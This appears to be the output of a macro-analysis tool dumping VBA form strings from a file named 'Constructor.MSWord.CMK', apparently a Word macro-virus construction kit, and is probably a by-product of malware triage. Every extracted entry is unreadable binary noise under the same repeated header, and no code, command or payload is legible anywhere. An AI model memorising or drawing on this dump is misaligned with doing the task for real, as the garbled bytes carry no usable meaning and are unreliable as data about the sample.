VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
(��
(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2p*֖Κ��!�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��i�QY�]4d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��瓊Ob���_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>Bʲ�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B�@kWD�kW�Nbe��Fw��µ��KK�'s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%݂�x���m'c���N	�'�I�j���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�o�+���7�g��#�&�<_f���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��2J-c����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S
N��nm*�����n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ޭ���Nq��&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٝOQ
�;r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�m,��l=��+�`�<c$�_%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
޺*��^�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�I�Z����]��]|�,�q��~�-G������`!8E�Es��X�0GQ]�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L�j~��JÓ�U�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�&��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��5!jani+�>QA��Sc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i���|#GCE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sI����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3u'��Z�W4�R�Ki
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ղ����p)J��r��̹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������72c�q�֭��o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1�pG����4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Px�.��3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;O�+ѧԴ{��v�@�����5�Z�Ji$�z8j4*��N˱N/
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�GU�`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
m0yRn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���++빴�ʴ�s���>�';��t�Q8�sĚ��"vV��$�5���-��qn̓8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k�<M��9d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�?C�\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���#knF�G8�լ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
NJҽ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���m�y�c<�n
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%����ߌ#K�H/6`��Mg�x���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�֭���s$��Ǽ{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\SSrw=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'efu�3m
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:|�W�=1�egd)"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+j-R}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e����rW=EY�����1�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=kL<\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�\�QJ2�s���T��O�RW��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F4�q��
[�g�B��!�>*M.�����jJ��(j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a8��
(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3Mk�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�D�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���R�V��H�p0m����@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Λ��I<_nu9C*��+�w�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Թi�I���ؙ�9st����P�����U+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�6ɂ|�^p��z��uf�e�t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
88"�tH-uخ�ieA����qG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�z�ά5	�dK���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O�C���ìC=��9L�+��{Սz�[ܙ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$7֭�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4a��F{W|e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��5M�=p�$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Wv���pN2y>�l&�-�Iȯe�X�i7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cX�}8�)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FA�Ey�N2M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
҂�9E�Ý!�]E����hC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�������w"N7&џSX?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Yvmi&<��W�q6�(`����k��l��CE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i?�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Mt:�	i)'�Ms�$:+1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B�z���+֞
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5���S���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�H9��575q��3M`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
EʜPX��\�~�[TH�v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���M+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S (��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x[��x�TXT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���\EnEʷ;��~w�-�W�QC��Eej�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/��1ՠ�/I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����^%����^���Xi62�$�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p+��eIݞ�|#�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��7��ٳ�}���+��
�i��{kY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�My��m 1��B��?�1�]��-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�iM{ ķ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���<�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S��F���][?,�H>��~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���'i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���֟�$iu���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�V?�}DYx�b*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�ڤ$�Y�*3�~�Pe�����Q����Y���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����6�����r+��w�=,,W+��u��*�H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�
���|M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ֺ;=F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]B+(�YO'�rjd�ڏR�{5�Sd��vS孬|�)�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�?2;x�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�^�_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��I''��Z�>H��1U�����
�h'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/ZCֶ9od<I��vj
~x�Ѥ&�L�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
5$�*)�ph[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;9�1a3Wa��&�΢
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S^���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yt����r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�I����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji=�j��/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��"A�޹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
mᑥ�m#4,v:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
fi%g`Ac�T�)I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�N1K~�*Kx$��H"]�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u���cY&f�
��ֳ�*��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
rQ=;�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A��i[ժ��}
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W`�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q��ؽ�.��Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K���Df\���y��1�朓A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�!S�&��^�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӹ�>���Y����L��=�*8yU�莌V2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y+��Cs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���-����S�L��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
y��=̿,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b%=�W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\������q(�3���]o�u
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*�pS�����M|�]�]��bq\M��Zj
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�) � l��l���,kn��n[�\�vach]�81�^�Et=�K񽆧wp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x5�x�X�f�+f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�+�Ve��Fx��P��S�'���n	nw�~+������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�'�K����;?�?Z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmJackie/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S{v�AO�̖/>W�(��#J1w��爜��t�
-------------------------------------------------------------------------------
